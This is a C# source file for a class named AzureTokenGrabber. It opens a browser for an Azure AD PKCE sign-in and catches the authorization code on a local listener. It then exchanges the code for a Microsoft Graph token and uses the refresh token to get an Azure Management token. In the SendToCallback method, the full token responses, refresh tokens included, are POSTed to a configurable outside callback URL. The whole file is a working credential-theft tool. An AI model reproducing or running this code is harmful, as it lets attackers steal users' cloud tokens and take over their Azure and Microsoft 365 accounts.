using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net;
using System.Net.Http;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace GrabTokenAzureAD
{
    public class AzureTokenGrabber : IDisposable
    {
        private readonly GrabberConfig _config;
        private readonly HttpClient _httpClient;
        private HttpListener _listener;
        private string _codeVerifier;
        private bool _disposed;

        public event EventHandler<string> OnStatus;
        public event EventHandler<TokenResult> OnTokenCaptured;

        public AzureTokenGrabber(GrabberConfig config = null)
        {
            _config = config ?? new GrabberConfig();
            _httpClient = new HttpClient { Timeout = TimeSpan.FromSeconds(30) };
        }

        public GrabResult GrabTokens()
        {
            return GrabTokensAsync(CancellationToken.None).GetAwaiter().GetResult();
        }

        public async Task<GrabResult> GrabTokensAsync(CancellationToken cancellationToken = default)
        {
            var result = new GrabResult();

            try
            {
                string codeChallenge = GeneratePkce();
                RaiseStatus("PKCE challenge generated");

                var listenerTask = StartListenerAsync(cancellationToken);

                string authUrl = BuildAuthorizationUrl(codeChallenge);
                RaiseStatus("Opening browser for authorization");

                OpenBrowser(authUrl);

                string authCode = await listenerTask;
                if (string.IsNullOrEmpty(authCode))
                {
                    result.Error = "No authorization code received";
                    SendError(result.Error);
                    return result;
                }

                result.AuthorizationCode = authCode;
                RaiseStatus("Authorization code captured");

                string graphJson = await ExchangeCodeForTokenRawAsync(authCode, _config.GraphScope, cancellationToken);
                result.GraphToken = ParseTokenResult(graphJson);
                result.GraphToken.Resource = "https://graph.microsoft.com";

                if (result.GraphToken.IsSuccess)
                {
                    RaiseStatus("Graph token obtained");
                    OnTokenCaptured?.Invoke(this, result.GraphToken);
                    SendToCallback("graph", graphJson);

                    if (!string.IsNullOrEmpty(result.GraphToken.RefreshToken))
                    {
                        string mgmtJson = await ExchangeRefreshTokenRawAsync(
                            result.GraphToken.RefreshToken,
                            _config.ManagementScope,
                            cancellationToken);
                        result.ManagementToken = ParseTokenResult(mgmtJson);
                        result.ManagementToken.Resource = "https://management.azure.com";

                        if (result.ManagementToken.IsSuccess)
                        {
                            RaiseStatus("Management token obtained");
                            OnTokenCaptured?.Invoke(this, result.ManagementToken);
                            SendToCallback("management", mgmtJson);
                        }
                        else
                        {
                            SendError("Management token failed: " + result.ManagementToken.Error);
                        }
                    }
                }
                else
                {
                    result.Error = result.GraphToken.ErrorDescription ?? result.GraphToken.Error;
                    SendError("Graph token failed: " + result.Error);
                }
            }
            catch (OperationCanceledException)
            {
                result.Error = "Operation cancelled";
                SendError(result.Error);
            }
            catch (Exception ex)
            {
                result.Error = ex.Message;
                RaiseStatus($"Error: {ex.Message}");
                SendError(ex.Message);
            }

            return result;
        }

        public async Task<TokenResult> ExchangeRefreshTokenAsync(
            string refreshToken,
            string scope,
            CancellationToken cancellationToken = default)
        {
            string json = await ExchangeRefreshTokenRawAsync(refreshToken, scope, cancellationToken);
            return ParseTokenResult(json);
        }

        private async Task<string> ExchangeRefreshTokenRawAsync(
            string refreshToken,
            string scope,
            CancellationToken cancellationToken)
        {
            var values = new Dictionary<string, string>
            {
                { "grant_type", "refresh_token" },
                { "client_id", _config.ClientId },
                { "refresh_token", refreshToken },
                { "scope", scope }
            };

            return await PostTokenRequestRawAsync(values, cancellationToken);
        }

        private string GeneratePkce()
        {
            byte[] bytes = new byte[32];
            using (var rng = RandomNumberGenerator.Create())
            {
                rng.GetBytes(bytes);
            }
            _codeVerifier = Base64UrlEncode(bytes);

            byte[] hash;
            using (var sha256 = SHA256.Create())
            {
                hash = sha256.ComputeHash(Encoding.ASCII.GetBytes(_codeVerifier));
            }
            return Base64UrlEncode(hash);
        }

        private static string Base64UrlEncode(byte[] bytes)
        {
            return Convert.ToBase64String(bytes)
                .Replace("+", "-")
                .Replace("/", "_")
                .Replace("=", "");
        }

        private string BuildAuthorizationUrl(string codeChallenge)
        {
            return $"{_config.Authority}/authorize?" +
                $"client_id={Uri.EscapeDataString(_config.ClientId)}" +
                $"&response_type=code" +
                $"&redirect_uri={Uri.EscapeDataString(_config.RedirectUri)}" +
                $"&scope={Uri.EscapeDataString(_config.GraphScope)}" +
                $"&code_challenge={codeChallenge}" +
                $"&code_challenge_method=S256";
        }

        private async Task<string> StartListenerAsync(CancellationToken cancellationToken)
        {
            string prefix = _config.RedirectUri;
            if (!prefix.EndsWith("/")) prefix += "/";

            _listener = new HttpListener();
            _listener.Prefixes.Add(prefix);
            _listener.Start();
            RaiseStatus($"Listening on {_config.RedirectUri}");

            using (var timeoutCts = new CancellationTokenSource(TimeSpan.FromSeconds(_config.ListenerTimeoutSeconds)))
            using (var linkedCts = CancellationTokenSource.CreateLinkedTokenSource(cancellationToken, timeoutCts.Token))
            {
                try
                {
                    var contextTask = _listener.GetContextAsync();
                    var completedTask = await Task.WhenAny(
                        contextTask,
                        Task.Delay(Timeout.Infinite, linkedCts.Token));

                    if (completedTask != contextTask)
                    {
                        _listener.Stop();
                        return null;
                    }

                    var context = await contextTask;
                    string code = ParseQueryString(context.Request.Url.Query, "code");

                    string html = "<html><body style='font-family:sans-serif;text-align:center;padding-top:50px;'>" +
                        "<h2>Authorization Complete</h2><p>You may close this tab.</p></body></html>";
                    byte[] buffer = Encoding.UTF8.GetBytes(html);
                    context.Response.ContentType = "text/html";
                    context.Response.ContentLength64 = buffer.Length;
                    await context.Response.OutputStream.WriteAsync(buffer, 0, buffer.Length, cancellationToken);
                    context.Response.Close();

                    _listener.Stop();
                    return code;
                }
                catch
                {
                    _listener?.Stop();
                    throw;
                }
            }
        }

        private static string ParseQueryString(string query, string key)
        {
            if (string.IsNullOrEmpty(query)) return null;
            if (query.StartsWith("?")) query = query.Substring(1);

            foreach (var pair in query.Split('&'))
            {
                var parts = pair.Split('=');
                if (parts.Length == 2 && parts[0] == key)
                {
                    return Uri.UnescapeDataString(parts[1]);
                }
            }
            return null;
        }

        private static void OpenBrowser(string url)
        {
            try
            {
                Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
            }
            catch
            {
                if (Environment.OSVersion.Platform == PlatformID.Unix)
                {
                    Process.Start("xdg-open", url);
                }
                else
                {
                    Process.Start("cmd", $"/c start {url}");
                }
            }
        }

        private async Task<string> ExchangeCodeForTokenRawAsync(
            string code,
            string scope,
            CancellationToken cancellationToken)
        {
            var values = new Dictionary<string, string>
            {
                { "grant_type", "authorization_code" },
                { "client_id", _config.ClientId },
                { "code", code },
                { "redirect_uri", _config.RedirectUri },
                { "code_verifier", _codeVerifier },
                { "scope", scope }
            };

            return await PostTokenRequestRawAsync(values, cancellationToken);
        }

        private async Task<string> PostTokenRequestRawAsync(
            Dictionary<string, string> values,
            CancellationToken cancellationToken)
        {
            using (var content = new FormUrlEncodedContent(values))
            {
                var response = await _httpClient.PostAsync(
                    $"{_config.Authority}/token",
                    content,
                    cancellationToken);

                return await response.Content.ReadAsStringAsync();
            }
        }

        private TokenResult ParseTokenResult(string json)
        {
            try
            {
                return TokenResult.FromJson(json);
            }
            catch
            {
                return new TokenResult { Error = "Failed to parse token response", RawJson = json };
            }
        }

        private void SendToCallback(string label, string tokenJson)
        {
            if (string.IsNullOrEmpty(_config.CallbackUrl)) return;

            try
            {
                string payload = $"{{\"label\":\"{label}\",\"token\":{tokenJson}}}";
                byte[] data = Encoding.UTF8.GetBytes(payload);

                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.UploadData(_config.CallbackUrl, "POST", data);
                }
                RaiseStatus($"Sent {label} token to callback");
            }
            catch (Exception ex)
            {
                RaiseStatus($"Callback failed for {label}: {ex.Message}");
            }
        }

        private void SendError(string error)
        {
            if (string.IsNullOrEmpty(_config.CallbackUrl)) return;

            try
            {
                string payload = $"{{\"error\":\"{EscapeJson(error)}\"}}";
                byte[] data = Encoding.UTF8.GetBytes(payload);

                using (var wc = new WebClient())
                {
                    wc.Headers[HttpRequestHeader.ContentType] = "application/json";
                    wc.UploadData(_config.CallbackUrl, "POST", data);
                }
            }
            catch { }
        }

        private static string EscapeJson(string s)
        {
            if (string.IsNullOrEmpty(s)) return s;
            return s.Replace("\\", "\\\\").Replace("\"", "\\\"").Replace("\n", "\\n").Replace("\r", "\\r");
        }

        private void RaiseStatus(string message)
        {
            OnStatus?.Invoke(this, message);
        }

        public void Dispose()
        {
            if (_disposed) return;
            _disposed = true;
            _listener?.Close();
            _httpClient?.Dispose();
        }
    }
}
